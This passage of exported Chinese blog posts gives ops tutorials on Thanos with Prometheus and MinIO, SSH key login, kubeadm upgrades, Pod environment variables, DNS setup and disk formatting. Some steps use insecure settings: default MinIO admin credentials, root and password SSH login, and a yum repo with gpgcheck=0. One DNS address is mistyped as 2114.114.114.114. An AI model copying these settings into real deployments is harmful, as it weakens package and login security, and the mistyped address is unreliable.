聚合起来，并没有提供抽样的能力，不能加快长期指标的查询，不适用于当前远端存储的场景。\n最后看到 Thanos Compact 组件能够对指标数据进行压缩和降采样，决定尝试使用 Thanos 作为目前多个 Prometheus 远端存储使用。\n3. Thanos 的几种部署方式 3.1 基础组件 Query, 实现了 Prometheus API，对外提供与 Prometheus 一致的查询接口 Sidecar, 用于连接 Prometheus，提供 Query 查询接口、也可以上报数据 Store Gateway, 访问放在对象存储的指标数据 Compact, 压缩采样、清理对象存储中的数据 Receive, 接收 Prometheus Remote Write 的数据 Ruler, 配置和管理告警规则 3.2 Receive 模式 Receive 模式下，需要在每一个 Prometheus 实例中配置 remote write 将数据上传给 Thanos。此时，由于实时数据全部都存储到了 Thanos Receiver，因此不需要 Sidecar 组件即可完成查询。\n优势：\n数据集中 Prometheus 无状态 只需要暴露 Receiver 给 Prometheus 访问 缺点:\nReceiver 承受大量 Prometheus 的 remote write 写入 3.3 Sidecar 模式 Sidecar 模式下，在每一个 Prometheus 实例旁添加一个 Thanos Sidecar 组件，以此来实现对 Prometheus 的管理。主要有两个功能：\n接受 Query 组件的查询请求。在 Thanos 查询短期数据时，请求会转到 Sidecar。 上传 Prometheus 的短期指标数据。默认每两个小时，创建一个块，上传到对象存储。 优势:\n集成容易，不需要修改原有配置 缺点:\n近期数据需要 Query 与 Sidecar 之间网络请求完成，会增加额外耗时 需要 Store Gateway 能访问每个 Prometheus 实例 4. 部署 Thanos 4.1 部署一个 Minio 请参考文档: Jenkins 中的构建产物与缓存\n安装完成之后，请根据文档中的配置进行测试，确保 Minio 服务正常工作。\n4.2 在 Minio 上创建一个名为 thanos 的 Bucket 如下图：\n4.3 检查 Prometheus 版本符合 Thanos 要求 目前 Thanos 要求 Prometheus 版本最好不低于 v2.13。\n4.4 部署 Thanos 确保 Kubernetes 集群上有默认的存储可用 1 2 3 4 5 kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE openebs-device openebs.io/local Delete WaitForFirstConsumer false 4d5h openebs-hostpath (default) openebs.io/local Delete WaitForFirstConsumer false 4d5h 新建一个命名空间 thanos 1 kubectl create ns thanos 部署 Thanos 1 git clone https://github.com/shaowenchen/demo 修改 demo/objectstorage.yaml 文件中的 Minio 访问地址。然后创建 Thanos 相关负载:\n1 kubectl apply -f ./demo/thanos-0.25/ 查看相关负载 1 2 3 4 5 6 7 8 kubectl -n thanos top pod NAME CPU(cores) MEMORY(bytes) thanos-compact-0 1m 30Mi thanos-query-7c745f5d7-svlgn 2m 76Mi thanos-receive-0 1m 15Mi thanos-rule-0 1m 18Mi thanos-store-0 1m 55Mi 部署 Thanos 消耗的资源很少。\n4.5 访问 Thanos Query 查看 Thanos 相关服务的端口 1 2 3 4 5 6 7 8 kubectl -n thanos get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE thanos-compact ClusterIP 10.233.47.253 \u0026lt;none\u0026gt; 10902/TCP 11h thanos-query NodePort 10.233.45.138 \u0026lt;none\u0026gt; 10901:32180/TCP,9090:32612/TCP 11h thanos-receive ClusterIP None \u0026lt;none\u0026gt; 10902/TCP,19291/TCP,10901/TCP 11h thanos-rule ClusterIP None \u0026lt;none\u0026gt; 10901/TCP,10902/TCP 11h thanos-store NodePort 10.233.41.159 \u0026lt;none\u0026gt; 10901:30901/TCP,10902:31426/TCP 10h 访问 Thanos Query 页面 thanos-query 在 9090 端口提供 http 访问入口，因此这里通过主机 IP:32612 端口访问 Query 组件提供的页面。\n5. 给 Prometheus 添加 Thanos Sidecar Sidecar 模式对 Thanos 配置要求更低，而 Receiver 模式需要不停地接受来自众多 Prometheus 的 Remote Write，这里出于成本考虑选择 Sidecar 模式。\n5.1 在 Prometheus 所在命名空间新增 S3 访问凭证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Secret metadata: name: thanos-objectstorage namespace: monitor type: Opaque stringData: objectstorage.yaml: | type: S3 config: bucket: \u0026#34;thanos\u0026#34; endpoint: \u0026#34;0.0.0.0:9000\u0026#34; insecure: true access_key: \u0026#34;minioadmin\u0026#34; secret_key: \u0026#34;minioadmin\u0026#34; EOF 这里直接使用的是管理员账户，如果是生产上，应该单独创建一个账户用于 Thanos 对 Minio 的使用。\n5.2 给 Prometheus 添加额外的 Label 标记实例 通过在 Prometheus 中添加 external_labels 可以给每个 Prometheus 实例全局添加一个额外的标签，用于唯一标记一个实例。\n编辑配置文件 1 kubectl -n monitor edit cm prometheus-server 添加如下内容 1 2 3 4 prometheus.yml: | global: external_labels: cluster: dev 这里添加了一个名为 cluster=dev 的标签。所有该 Prometheus 实例上报的指标都会带上此标签，方便查询过滤。\n5.3 修改 Prometheus 启动参数关闭压缩 编辑 Prometheus 部署文件 有的是用 Deployment，有的是用 StatefulSet 部署，都需要修改 Prometheus 的启动参数\n1 kubectl -n monitor edit deploy prometheus-server 修改 tsdb 存储块最大、最小值相等 1 2 3 4 5 - --web.enable-admin-api - --web.enable-lifecycle - --storage.tsdb.max-block-duration=2h - --storage.tsdb.min-block-duration=2h image: quay.io/prometheus/prometheus:v2.31.1 storage.tsdb.min-block-duration 和 storage.tsdb.max-block-duration 相等，才能保障 Prometheus 关闭了本地压缩，避免压缩时，Thanos 上传失败。\n5.4 给 Prometheus 添加 Thanos Sidecar 编辑 Prometheus 部署文件 1 kubectl -n monitor edit deploy prometheus-server 新增如下容器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 - args: - sidecar - --log.level=debug - --tsdb.path=/data - --prometheus.url=http://127.0.0.1:9090 - --objstore.config-file=/etc/objectstorage.yaml name: thanos-sidecar image: thanosio/thanos:v0.25.0 env: - name: POD_NAME valueFrom: fieldRef: fieldPath: metadata.name ports: - name: http-sidecar containerPort: 10902 - name: grpc containerPort: 10901 livenessProbe: httpGet: port: 10902 path: /-/healthy readinessProbe: httpGet: port: 10902 path: /-/ready volumeMounts: - mountPath: /data name: storage-volume - name: thanos-objectstorage subPath: objectstorage.yaml mountPath: /etc/objectstorage.yaml 新增挂载秘钥 1 2 3 - name: thanos-objectstorage secret: secretName: thanos-objectstorage 重启 Prometheus 滚动升级会遇到如下错误，因为上一个 Prometheus Pod 没有释放文件目录导致。\n1 ts=2022-03-21T04:06:39.267Z caller=main.go:932 level=error err=\u0026#34;opening storage failed: lock DB directory: resource temporarily unavailable\u0026#34; 因此需要先将副本数设置为 0，在将其设置为 1，重启 Prometheus。\n1 2 kubectl -n monitor scale deploy prometheus-server --replicas=0 kubectl -n monitor scale deploy prometheus-server --replicas=1 5.5 在 Prometheus Sidecar 添加 Grpc 远程访问端口 编辑 Prometheus Service 配置 1 kubectl -n monitor edit svc prometheus-server 新增一个 Service 端口暴露 Grpc 服务给 Thanos Store Gateway 1 2 3 4 5 6 7 ports: - name: sidecar-grpc nodePort: 30901 port: 10901 protocol: TCP targetPort: 10901 type: NodePort 5.6 在 Thanos Query 添加 Store Grpc 地址 最后还需要在 Thanos Store Gateway 中添加上面 Prometheus Sidecar 的 Grpc 地址。\n编辑 Thanos Query 1 kubectl -n thanos edit deploy thanos-query 在启动参数中添加 --store=0.0.0.0:30901 1 2 3 4 5 6 7 8 9 10 11 - args: - query - --log.level=debug - --query.auto-downsampling - --grpc-address=0.0.0.0:10901 - --http-address=0.0.0.0:9090 - --query.partial-response - --query.replica-label=prometheus_replica - --query.replica-label=rule_replica - --store=0.0.0.0:30901 image: thanosio/thanos:v0.25.0 这里的 0.0.0.0:30901 需要替换为上面 Prometheus Sidecar 暴露的 Grpc 访问入口。这样，Thanos Query 提供查询能力时，短期数据就会调用 Grpc 查询，而不是查询对象存储中的数据。\n此时，在上面提到 Thanos Query 页面以及可以看到新增的 0.0.0.0:30901 这个 Endpoint 记录，状态应该是 Up。\n5.7 在 Minio 中查看同步的数据 一共添加了 6 个集群，每个集群大约 40 个 Pod，半天时间大约用了 2.1 GB 存储、303 个对象。\n6. Grafana 配置 6.1 添加数据源 在 Grafana 添加 Thanos Query 数据源的方式和添加 Prometheus 一样。如下图:\n6.2 修改 Grafana 面板适配 cluster 标签过滤 这里在基于 Kubernetes 集群查看的面板，稍微进行修改。\n添加 cluster 过滤的变量 在上面，我在每一个 Prometheus 中都添加了一个全局的 external_labels，通过 cluster 字段来区分不同的集群。\n如上图，在面板中添加一个 Cluster 变量，使用指标中的 cluster 标签进行过滤。\n编辑每个视图的过滤查询条件 如上图，需要在每个视图的表达式中增加一个额外的过滤条件，cluster=~\u0026quot;^$Cluster$\u0026quot;}。当然，也可以将面板导出，在编辑器中批量修改之后再导入 Grafana。\n6.3 查看 Thanos 和 Prometheus 数据源 使用 Thanos 数据源 使用 Prometheus 数据源 对比两个面板的数据，可以发现他们展示的指标一致。因此，我们可以使用一个 Thanos 数据源替代多个 Prometheus 数据源分散管理的场景。\n这里数据的时间尺度没有达到 Thanos Compact 组件的参数设置，因此没有体现出降采样的效果。\n7. 总结 本篇主要是阐述了监控数据层管理的一些想法。\n首先是数据要分层，短期数据直接存储在就近的 Prometheus，长期数据存储在 Thanos 的对象存储中。短期数据提供给告警系统的高频查询，长期数据提供给人用于分析。\n选择 Thanos 的主要原因是其降采样。Thanos compact 组件提供了 5 分钟、1 小时的降采样，以 Prometheus 每 15s 采样频率计算，压缩将达到 20 倍、240 倍，能够大大缓解长周期查询压力。采用 Sidecar 模式时，短期的数据会通过 Grpc 调用 Prometheus 的 API 查询。\n最后当然是将本地用的 6 个集群都接入了 Thanos。只有亲自尝试过之后，才会真切地体会到其中的一些细节和处理逻辑。虽然架构图、文档、博客看了不少，但是都不如自己亲自尝试一次。\n8. 参考 https://thanos.io/tip/thanos/quick-tutorial.md/ https://artifacthub.io/packages/helm/bitnami/thanos https://github.com/shaowenchen/demo https://imroc.cc/post/202004/build-cloud-native-large-scale-distributed-monitoring-system-3/ ","description":"","id":172,"section":"post","tags":["博文","Thanos","Prometheus","监控","存储"],"title":"使用 Thanos 集中管理多 Prometheus 实例数据","uri":"https://www.chenshaowen.com/blog/manage-multiple-prometheus-using-thanos.html"},{"content":"1. 添加 key 的步骤 1.1 客户端生成 ssh key 有两种格式的 Key:\n老格式，私钥以 -----BEGIN RSA PRIVATE KEY----- 开头 1 ssh-keygen -m PEM -t rsa -b 4096 -C \u0026#34;mail@chenshaowen.com\u0026#34; 新格式，私钥以 -----BEGIN OPENSSH PRIVATE KEY----- 开头 1 ssh-keygen -t rsa -b 4096 -C \u0026#34;mail@chenshaowen.com\u0026#34; 由于某些旧的系统不支持新格式的 Key，这里建议生成老格式的 Key。如果你已经在使用新格式的 Key，可以使用 puttygen 工具将新格式的 Key 转换为老的格式。\n1.2 服务端确保 sshd 允许 key 登录 编辑 /etc/ssh/sshd_config 文件，确保以下配置打开:\nPubkeyAuthentication yes AuthorizedKeysFile\t.ssh/authorized_keys PermitRootLogin yes PasswordAuthentication yes 在没有成功配置 Key 登录之前，建议保留 PasswordAuthentication 登录方式。是否允许 root 登录，得看具体需求，通常会禁用。\n修改完 sshd 配置之后，可以先测试配置文件是否正确。\n1 sshd -t 确保无报错信息之后，再重启 sshd。\n1 systemctl restart sshd 1.3 服务端上将客户端上的 key 添加到 authorized_keys 编辑登录用户的 authorized_keys 文件，添加公钥。公钥存储在客户端 ~/.ssh/id_rsa.pub 文件中。\n在客户端获取公钥 1 2 3 cat ~/.ssh/id_rsa.pub xxxx 在服务端添加公钥 1 vim ~/.ssh/authorized_keys 至此，正常情况下就可以使用 key 登录了。但是总能碰到各种问题，不能一次性配置成功。我就遇到过在 CentOS 7.6 上给 root 配置 key 一直不成功的情况。大概忍受密码登录半年之后，终于看 sshd 日志时发现了端倪，原来是 home 目录权限的问题。下面是一些常见的排查方法。\n2. 查看 ssh 访问日志 使用 -v 参数，查看详细日志。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 ssh root@1.1.1.1 -v OpenSSH_8.9p1, OpenSSL 1.1.1m 14 Dec 2021 debug1: Reading configuration data /Users/shaowenchen/.ssh/config debug1: Reading configuration data /usr/local/etc/ssh/ssh_config debug1: Connecting to 1.1.1.1 port 22. debug1: Connection established. debug1: identity file /Users/shaowenchen/.ssh/id_rsa type 0 debug1: identity file /Users/shaowenchen/.ssh/id_rsa-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ecdsa type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ecdsa-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ecdsa_sk type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ecdsa_sk-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ed25519 type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ed25519-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ed25519_sk type -1 debug1: identity file /Users/shaowenchen/.ssh/id_ed25519_sk-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_xmss type -1 debug1: identity file /Users/shaowenchen/.ssh/id_xmss-cert type -1 debug1: identity file /Users/shaowenchen/.ssh/id_dsa type -1 debug1: identity file /Users/shaowenchen/.ssh/id_dsa-cert type -1 debug1: Local version string SSH-2.0-OpenSSH_8.9 debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4 debug1: compat_banner: match: OpenSSH_7.4 pat OpenSSH_7.4* compat 0x04000006 debug1: Authenticating to 1.1.1.1:22 as \u0026#39;root\u0026#39; debug1: load_hostkeys: fopen /Users/shaowenchen/.ssh/known_hosts2: No such file or directory debug1: load_hostkeys: fopen /usr/local/etc/ssh/ssh_known_hosts: No such file or directory debug1: load_hostkeys: fopen /usr/local/etc/ssh/ssh_known_hosts2: No such file or directory debug1: SSH2_MSG_KEXINIT sent debug1: SSH2_MSG_KEXINIT received debug1: kex: algorithm: curve25519-sha256 debug1: kex: host key algorithm: ecdsa-sha2-nistp256 debug1: kex: server-\u0026gt;client cipher: chacha20-poly1305@openssh.com MAC: \u0026lt;implicit\u0026gt; compression: none debug1: kex: client-\u0026gt;server cipher: chacha20-poly1305@openssh.com MAC: \u0026lt;implicit\u0026gt; compression: none debug1: expecting SSH2_MSG_KEX_ECDH_REPLY debug1: SSH2_MSG_KEX_ECDH_REPLY received debug1: Server host key: ecdsa-sha2-nistp256 SHA256:dIN1fBcDGeQ07m3An2G+p5sNC0Sx9TEAg95qXSs01s8 debug1: load_hostkeys: fopen /Users/shaowenchen/.ssh/known_hosts2: No such file or directory debug1: load_hostkeys: fopen /usr/local/etc/ssh/ssh_known_hosts: No such file or directory debug1: load_hostkeys: fopen /usr/local/etc/ssh/ssh_known_hosts2: No such file or directory debug1: Host \u0026#39;1.1.1.1\u0026#39; is known and matches the ECDSA host key. debug1: Found key in /Users/shaowenchen/.ssh/known_hosts:2 debug1: rekey out after 134217728 blocks debug1: SSH2_MSG_NEWKEYS sent debug1: expecting SSH2_MSG_NEWKEYS debug1: SSH2_MSG_NEWKEYS received debug1: rekey in after 134217728 blocks debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities debug1: Will attempt key: /Users/shaowenchen/.ssh/id_rsa RSA SHA256:xxx/bYCe3TYhQ68gJA debug1: Will attempt key: /Users/shaowenchen/.ssh/id_ecdsa debug1: Will attempt key: /Users/shaowenchen/.ssh/id_ecdsa_sk debug1: Will attempt key: /Users/shaowenchen/.ssh/id_ed25519 debug1: Will attempt key: /Users/shaowenchen/.ssh/id_ed25519_sk debug1: Will attempt key: /Users/shaowenchen/.ssh/id_xmss debug1: Will attempt key: /Users/shaowenchen/.ssh/id_dsa debug1: SSH2_MSG_EXT_INFO received debug1: kex_input_ext_info: server-sig-algs=\u0026lt;rsa-sha2-256,rsa-sha2-512\u0026gt; debug1: SSH2_MSG_SERVICE_ACCEPT received debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic debug1: Next authentication method: publickey debug1: Offering public key: /Users/shaowenchen/.ssh/id_rsa RSA SHA256:xxx/xxx debug1: Server accepts key: /Users/shaowenchen/.ssh/id_rsa RSA SHA256:xxx/xxx Authenticated to 1.1.1.1 using \u0026#34;publickey\u0026#34;. debug1: channel 0: new [client-session] debug1: Requesting no-more-sessions@openssh.com debug1: Entering interactive session. debug1: pledge: filesystem debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0 debug1: client_input_hostkeys: searching /Users/shaowenchen/.ssh/known_hosts for 1.1.1.1 / (none) debug1: client_input_hostkeys: searching /Users/shaowenchen/.ssh/known_hosts2 for 1.1.1.1 / (none) debug1: client_input_hostkeys: hostkeys file /Users/shaowenchen/.ssh/known_hosts2 does not exist debug1: client_global_hostkeys_private_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding Learned new hostkey: ED25519 SHA256:xxx/xxx Adding new key for 1.1.1.1 to /Users/shaowenchen/.ssh/known_hosts: ssh-ed25519 SHA256:xxx/xxx debug1: update_known_hosts: known hosts file /Users/shaowenchen/.ssh/known_hosts2 does not exist 可以看到 ssh 客户端会在运行环境下，尝试各种登录方式，直到登录成功；如果尝试完全部方式，依然没有成功，将会报错。\n3. 查看 sshd 访问日志 sshd 的日志是一个容易被忽略的地方，但是能提供非常有用的信息。\n1 2 3 4 5 6 7 8 9 10 11 12 journalctl -u sshd -f -- Logs begin at Wed 2021-12-15 10:44:46 CST. -- Mar 09 19:56:22 node1 sshd[171565]: Accepted publickey for root from 1.1.1.1 port 61832 ssh2: RSA SHA256:xxx/xxx Mar 10 08:17:15 node1 sshd[2028880]: Accepted publickey for root from 1.1.1.1 port 63966 ssh2: RSA SHA256:xxx/xxx Mar 10 08:23:49 node1 sshd[2045429]: Accepted publickey for root from 1.1.1.1 port 64047 ssh2: RSA SHA256:xxx/xxx Mar 10 08:32:11 node1 systemd[1]: Stopping OpenSSH server daemon... Mar 10 08:32:11 node1 sshd[171382]: Received signal 15; terminating. Mar 10 08:32:11 node1 systemd[1]: Stopped OpenSSH server daemon. Mar 10 08:32:11 node1 systemd[1]: Starting OpenSSH server daemon... Mar 10 08:32:11 node1 sshd[2066365]: Server listening on 0.0.0.0 port 22. Mar 10 08:32:11 node1 sshd[2066365]: Server listening on :: port 22. 我碰到的问题，就是看到了这行日志：sshd[7302]: Authentication refused: bad ownership or modes for directory /root，才发现用户 home 目录权限不对。\n4. 查看服务端文件权限 需要检查一下相关目录或文件的权限：\n~ ~/.ssh ~/.ssh/authorized_keys 如果不符合预期，需要修正权限:\n1 2 3 chmod -R 750 ~ chmod 700 ~/.ssh chmod 600 ~/.ssh/authorized_keys ","description":"","id":173,"section":"post","tags":["博文","SSH","运维","配置"],"title":"添加 SSH Key 登录及问题排查","uri":"https://www.chenshaowen.com/blog/add-ssh-key-login-os-and-troubleshooting.html"},{"content":" 升级思路是，驱逐负载、摘除流量之后，先升级控制节点，后升级工作节点。\n1. 查看集群版本 1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;20\u0026#34;, GitVersion:\u0026#34;v1.20.4\u0026#34;, GitCommit:\u0026#34;e87da0bd6e03ec3fea7933c4b5263d151aafd07c\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2021-02-18T16:12:00Z\u0026#34;, GoVersion:\u0026#34;go1.15.8\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;22\u0026#34;, GitVersion:\u0026#34;v1.22.0\u0026#34;, GitCommit:\u0026#34;c2b5237ccd9c0f1d600d3072634ca66cefdf272f\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2021-08-04T17:57:25Z\u0026#34;, GoVersion:\u0026#34;go1.16.6\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 当前版本是 1.22，由于 kubeadm 不允许跨版本升级，这里准备升级到 1.23 。\n2. 添加 Kubernetes 安装源 CentOS 操作系统:\n1 2 3 4 5 6 7 8 9 10 cat \u0026gt; /etc/yum.repos.d/kubernetes.repo \u0026lt;\u0026lt; EOF [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 epo_gpgcheck=0 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF Ubuntu 操作系统:\n1 2 3 4 5 6 apt-get update \u0026amp;\u0026amp; apt-get install -y apt-transport-https curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apt/sources.list.d/kubernetes.list deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main EOF apt-get update 3. 查找目标版本的 kubeadm 1 2 3 4 yum list --showduplicates kubeadm --disableexcludes=kubernetes ... kubeadm.x86_64 1.23.4-0 kubernetes 4. 升级 Kubeadm 1 2 yum remove -y kubeadm yum install -y kubeadm-1.23.4-0 --disableexcludes=kubernetes 5. 查看升级计划 这里忽略掉了一些错误情况，强行查看升级计划。\n1 2 3 4 5 6 7 8 9 10 11 12 kubeadm upgrade plan --ignore-preflight-errors=ControlPlaneNodesReady,CoreDNSUnsupportedPlugins,CoreDNSMigration ... Upgrade to the latest stable version: COMPONENT CURRENT TARGET kube-apiserver v1.22.0 v1.23.4 kube-controller-manager v1.22.0 v1.23.4 kube-scheduler v1.22.0 v1.23.4 kube-proxy v1.22.0 v1.23.4 CoreDNS v1.8.4 v1.8.6 etcd 3.5.0-0 3.5.1-0 6. 拉取依赖的镜像 提前拉取依赖，可以提前发现无法拉取的镜像，还可以加快升级过程。如果拉取不到镜像，可以通过 kubeadm config images list 命令查看镜像列表，然后通过下面的方式拉取镜像:\n1 2 docker pull hubimage/kube-apiserver:v1.23.4 docker tag hubimage/kube-apiserver:v1.23.4 k8s.gcr.io/kube-apiserver:v1.23.4 直接拉取依赖的镜像:\n1 2 3 4 5 6 7 8 9 kubeadm config images pull [config/images] Pulled k8s.gcr.io/kube-apiserver:v1.23.4 [config/images] Pulled k8s.gcr.io/kube-controller-manager:v1.23.4 [config/images] Pulled k8s.gcr.io/kube-scheduler:v1.23.4 [config/images] Pulled k8s.gcr.io/kube-proxy:v1.23.4 [config/images] Pulled k8s.gcr.io/pause:3.6 [config/images] Pulled k8s.gcr.io/etcd:3.5.1-0 [config/images] Pulled k8s.gcr.io/coredns/coredns:v1.8.6 7. 开始升级 Kubernetes 集群 1 2 3 4 kubeadm upgrade apply v1.23.4 --ignore-preflight-errors=ControlPlaneNodesReady,CoreDNSUnsupportedPlugins,CoreDNSMigration [upgrade/successful] SUCCESS! Your cluster was upgraded to \u0026#34;v1.23.4\u0026#34;. Enjoy! [upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven\u0026#39;t already done so. 8. 升级 kubectl 和 kubelet 1 yum install -y kubelet-1.23.4-0 kubectl-1.23.4-0 --disableexcludes=kubernetes ","description":"","id":174,"section":"post","tags":["博文","Kubernetes","升级","运维"],"title":"如何升级 Kubernetes 集群","uri":"https://www.chenshaowen.com/blog/how-upgrade-kubernetes-cluster.html"},{"content":"1. Kubernetes Pod 引用环境变量的几种方式 1.1 直接 Key/Value 可以直接设置 Value 值，也可以将当前 Pod 的信息作为 Value 值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 apiVersion: v1 kind: Pod metadata: name: envar-demo labels: purpose: demonstrate-envars spec: containers: - name: envar-demo-container image: gcr.io/google-samples/node-hello:1.0 env: - name: DEMO_GREETING value: \u0026#34;Hello from the environment\u0026#34; - name: DEMO_FAREWELL value: \u0026#34;Such a sweet sorrow\u0026#34; - name: MY_NODE_NAME valueFrom: fieldRef: fieldPath: spec.nodeName - name: MY_POD_NAME valueFrom: fieldRef: fieldPath: metadata.name 1.2 从 Secret 引用 有两种方式引用 Secret 中的变量：\n通过 envFrom 引用 Secret 中全部变量 通过 valueFrom 引用 Secret 中指定变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: v1 kind: Pod metadata: name: secret-env-pod spec: containers: - name: mycontainer image: redis envFrom: - secretRef: name: secret-config env: - name: SECRET_USERNAME valueFrom: secretKeyRef: name: secret-config key: username - name: SECRET_PASSWORD valueFrom: secretKeyRef: name: secret-config key: password 1.3 从 ConfigMap 引用 有两种方式引用 ConfigMap 中的变量：\n通过 envFrom 引用 ConfigMap 中全部变量 通过 valueFrom 引用 ConfigMap 中指定变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: v1 kind: Pod metadata: name: dapi-test-pod spec: containers: - name: test-container image: k8s.gcr.io/busybox envFrom: - configMapRef: name: configmap-config env: - name: SPECIAL_LEVEL_KEY valueFrom: configMapKeyRef: name: special-config key: special.how - name: LOG_LEVEL valueFrom: configMapKeyRef: name: env-config key: log_level 2. 变量引用的优先级 从源码中可以看到的实现逻辑是，会初始化一个 Map 存放环境变量，然后按照如下步骤进行处理:\n按顺序遍历 envFrom 引用的 ConfigMap 和 Secret 的 Key/Value 按顺序遍历 env 中的设置的 Key/Value 由于 Pod 默认开启了 EnableServiceLinks，最后还需要将 Service 相关变量注入 优先级是，Service 变量 \u0026gt; Env \u0026gt; EnvFrom，其中 EnvFrom 的优先级是后面覆盖前面。\n这里单独说下，注入到环境变量中的 Service 相关变量:\n注入的范围。所在命名空间的所有 Service 注入的内容。同一命名空间下，所有的服务地址、端口、协议。 注入的格式。大写字母加下划线的格式，例如 ADMIN_WEB_PC_TEST_PORT_80_TCP=tcp://10.233.45.183:80，ADMIN_WEB_PC_TEST_PORT=tcp://10.233.45.183:80，ADMIN_WEB_PC_TEST_PORT_80_TCP_ADDR=10.233.45.183，ADMIN_WEB_PC_TEST_PORT_80_TCP_PORT=80，ADMIN_WEB_PC_TEST_PORT_80_TCP_PROTO=tcp 。如果同一个命名空间下，部署大量服务，每个 Pod 中可能会增加几百个这样的变量。 3. 参考 https://github.com/kubernetes/kubernetes/blob/eacbf87bfe105b1b24f6226640ea85c93462401e/pkg/kubelet/kubelet_pods.go#L575 https://github.com/kubernetes/kubernetes/blob/eacbf87bfe105b1b24f6226640ea85c93462401e/pkg/kubelet/envvars/envvars.go#L32:6 ","description":"","id":175,"section":"post","tags":["博文","Kubernetes","环境变量"],"title":"如何在 Kubernetes Pod 中注入环境变量及优先级问题","uri":"https://www.chenshaowen.com/blog/injecting-env-vars-to-kubernetes-pod-and-priority.html"},{"content":"1. 给主机添加 DNS 1.1 CentOS 第一种方法: /etc/resolv.conf 管理 DNS\n禁用 NetworkManager 如果不禁用 NetworkManager，在重启 NetworkManager 组件之后，直接在 /etc/resolv.conf 中添加的 DNS 记录会丢失。\n1 2 3 4 vim /etc/NetworkManager/NetworkManager.conf [main] dns=none 在 [main] 部分添加 dns=none。\n此时重启 NetworkManager，对已经添加到 /etc/resolv.conf 的记录无影响 1 systemctl restart network 第二种方式: NetworkManager 管理 DNS\n查看本地网络 1 2 3 4 5 6 nmcli connection show NAME UUID TYPE DEVICE ens192 03da7500-2101-c722-2438-d0d006c28c73 ethernet ens192 br-006fb59057ed 07e61d55-0c2e-4d63-bba9-52854cf9ad75 bridge br-006fb59057ed virbr0 ff8cf6fe-0613-4ba8-ac32-0afd2c6044b6 bridge virbr0 修改 NetworkManager 网卡配置文件 获取到本地网卡名为 ens192 之后，即可编辑该网卡的配置文件，添加 DNS。\n1 2 3 4 5 vim /etc/sysconfig/network-scripts/ifcfg-ens192 #添加 DNS1=119.29.29.29 DNS2=2114.114.114.114 重启 NetworkManager 生成配置文件 需要注意的是，此时在 /etc/resolv.conf 文件中的 DNS 记录会被清理掉，请注意备份。\n1 cp /etc/resolv.conf /etc/resolv.conf.backup-$(date +%Y%m%d-%H%M%S) 1 systemctl restart network 查看生成的 /etc/resolv.conf 文件 1 2 3 4 5 cat /etc/resolv.conf # Generated by NetworkManager nameserver 119.29.29.29 nameserver 114.114.114.114 1.2 Ubuntu 由于 resolv.conf 是自动生成的，需要改 resolved.conf 才行。\n1 2 3 4 5 vim /etc/systemd/resolved.conf [Resolve] DNS=114.114.114.114 DNS=8.8.8.8 接着重启 resolve 服务。\n1 systemctl restart systemd-resolved.service 最后，还可以确认下配置是否生效。\n1 systemd-resolve --status 2. 重启 Nodelocaldns 在 Pod 中发起外部请求时，解析逻辑是 nodelocaldns -\u0026gt; 节点配置的 DNS -\u0026gt; 返回 IP。\n1 kubectl -n kube-system rollout restart ds nodelocaldns 3. 参考 Kubernetes 中的 DNS 服务 ","description":"","id":176,"section":"post","tags":["博文","Kubernetes","DNS","运维"],"title":"给 Kubernetes 集群新增外部 DNS 服务","uri":"https://www.chenshaowen.com/blog/add-outer-dns-server-to-kubernetes-cluster.html"},{"content":"1. 硬盘格式化 查看新磁盘 1 fdisk -l 通常，第二块硬盘的名字会是 /dev/sdb 。\n磁盘分区 1 fdisk /dev/sdb 会有提示输入参数：\ncommand (m for help):n\nPartition number(1-4):1\nFirst cylinder (1-22800,default 1):Enter\ncommand (m for help):w\n格式化磁盘为 ext4 1 mkfs.ext4 /dev/sdb 将磁盘挂载到指定目录 1 2 mkdir /data mount -t ext4 